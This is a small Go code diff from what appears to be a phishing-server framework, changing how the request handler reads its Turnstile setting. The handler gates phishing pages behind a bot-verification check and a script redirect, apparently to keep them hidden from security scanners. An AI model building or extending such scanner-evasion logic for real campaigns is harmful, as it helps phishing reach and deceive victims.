@@ -285,7 +285,7 @@ func (ps *PhishingServer) PhishHandler(w http.ResponseWriter, r *http.Request) {
 	}
 	switch {
 	case r.Method == "GET":
-		if config.UseTurnstile {
+		if ps.config.UseTurnstile {
 			if !ps.verifyTurnstileSession(r) {
 				redirect := `<script>window.location.replace('https://` + r.Host + `/verify?sq=` + rid + `');</script>`
 				fmt.Fprint(w, fmt.Sprintf(redirect))
